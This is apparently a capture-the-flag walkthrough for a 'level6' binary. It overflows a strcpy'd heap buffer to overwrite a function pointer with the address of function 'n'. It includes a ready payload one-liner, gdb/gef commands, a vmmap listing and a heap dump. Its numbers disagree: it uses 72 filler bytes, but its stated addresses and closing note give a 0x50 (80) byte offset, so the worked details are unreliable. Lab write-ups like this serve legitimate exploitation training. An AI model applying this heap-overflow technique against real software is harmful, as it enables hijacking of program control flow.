# Level6 Walkthrough

## Overview
- `level6` uses a heap buffer written with `strcpy`.
- A function pointer on the heap can be overwritten by overflowing the heap buffer.
- The goal is to replace that function pointer with the address of `n`.

## Vulnerability
- The program copies attacker-controlled data into a heap buffer without bounds checking.
- The copy overwrites adjacent heap data, including a function pointer.
- Control flow can be redirected by writing the address of `n` into that pointer.

## Target
- Heap buffer start: `0x087a51a0`
- Function pointer location: `0x087a51f0`
- `n` function address: `0x08048454`

## Exploit
- Overflow from the heap buffer to the function pointer.
- Use `72` bytes of filler to reach the pointer.
- Overwrite the pointer with `0x08048454` in little-endian form.

Example payload:

```bash
python -c 'print("X"*72 + "\x54\x84\x04\x08")' > /tmp/out
./level6 $(cat /tmp/out)
```

## Debugging Commands
- Start `gdb` with a short input so execution reaches `strcpy` safely:

```bash
root@bd4ea36e091f:~/host-files# gdb -q --args ./level6 $(python3 -c 'print("A"*30)')
```

- Set a breakpoint at the `strcpy` call in `main`:

```gdb
gef➤  br *main+73
Breakpoint 1 at 0x080484c5
   0x080484c5 <+73>:    call   0x08048340 <strcpy@plt>
```

- Single-step to enter `strcpy`:

```gdb
gef➤  ni
```

- Inspect the heap mapping:

```gdb
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /root/host-files/level6
0x08049000 0x0804a000 0x00000000 rw- /root/host-files/level6
0x087a5000 0x087c7000 0x00000000 rw- [heap]
```

- Dump the heap region starting at the buffer address:

```gdb
gef➤  x/200wx 0x087a51a0
```

## Explanation
- The first 72 bytes fill the heap buffer and any intermediate fields.
- The next 4 bytes overwrite the function pointer at `0x087a51f0`.
- `0x08048454` is the address of `n` and is written in little-endian order.

Heap layout around the target:

```text
0x087a51a0:    0x41414141    0x41414141    0x41414141    0x41414141
0x087a51b0:    0x41414141    0x41414141    0x41414141    0x00004141
0x087a51c0:    0x00000000    0x00000000    0x00000000    0x00000000
0x087a51d0:    0x00000000    0x00000000    0x00000000    0x00000000
0x087a51e0:    0x00000000    0x00000000    0x00000000    0x00000011
0x087a51f0:    0x08048468    0x00000000    0x00000000    0x00021e09
```

## Result
- The heap function pointer at `0x087a51f0` becomes `0x08048454`.
- When the pointer is called, the program transfers control to `n`.

## Notes
- Use `gdb` and `vmmap` to confirm the heap addresses.
- The critical offset is `0x50` bytes from buffer start to the pointer.
- Confirm the exploit payload with a controlled heap write before running the final attack.
